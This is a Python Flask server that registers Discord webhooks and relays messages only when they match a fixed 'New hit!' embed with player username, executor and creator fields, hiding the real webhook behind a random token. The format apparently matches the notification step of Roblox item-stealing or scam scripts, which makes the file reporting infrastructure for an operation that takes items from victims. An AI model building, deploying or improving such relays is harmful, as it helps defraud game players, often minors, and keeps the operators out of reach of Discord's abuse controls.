from flask import Flask, request, jsonify
from flask_cors import CORS
import requests, time, string, random, os

app = Flask(__name__)
CORS(app)

webhook_map = {}  # token -> Discord webhook
ip_registry = {}  # token+IP -> last request timestamp
LIMIT_SECONDS = 3600  # 1 webhook per hour per IP

def generate_token(length=6):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

@app.route("/")
def home():
    return """
    <h1>✅ Webhook Proxy is Running</h1>
    <p>Use <code>/create</code> to register a Discord webhook.</p>
    <p>Then use the returned proxy URL to send validated messages.</p>
    """

@app.route("/create", methods=["POST"])
def create_webhook():
    data = request.json
    real_webhook = data.get("real_webhook")

    if not real_webhook or "discord.com/api/webhooks/" not in real_webhook:
        return jsonify({"error": "Invalid Discord webhook URL"}), 400

    token = generate_token()
    webhook_map[token] = real_webhook

    base_url = request.host_url.rstrip("/")
    return jsonify({"proxy_url": f"{base_url}/webhook/{token}"})

@app.route("/webhook/<token>", methods=["POST"])
def handle_webhook(token):
    if token not in webhook_map:
        return jsonify({"error": "Invalid token"}), 404

    client_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    key = f"{token}:{client_ip}"

    if key in ip_registry and time.time() - ip_registry[key] < LIMIT_SECONDS:
        return jsonify({
            "error": "Rate limited",
            "time_remaining": int(LIMIT_SECONDS - (time.time() - ip_registry[key]))
        }), 429

    data = request.json
    if not data or "embeds" not in data:
        return jsonify({"error": "Missing or invalid 'embeds'"}), 400

    # Embed content check
    allowed = False
    for embed in data["embeds"]:
        if embed.get("title", "").strip() == "New hit!\nWhen ingame say anything in the chat to recive the stuff":
            for field in embed.get("fields", []):
                if field.get("name") == "Player Info":
                    value = field.get("value", "")
                    if all(x in value for x in ["Username:", "Executor:", "Creator:"]):
                        allowed = True
                        break

    if not allowed:
        return jsonify({"error": "Embed content not allowed"}), 400

    ip_registry[key] = time.time()
    response = requests.post(webhook_map[token], json=data)

    return jsonify({
        "status": "sent",
        "discord_status": response.status_code
    })

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))  # Render uses dynamic port
    app.run(host="0.0.0.0", port=port)
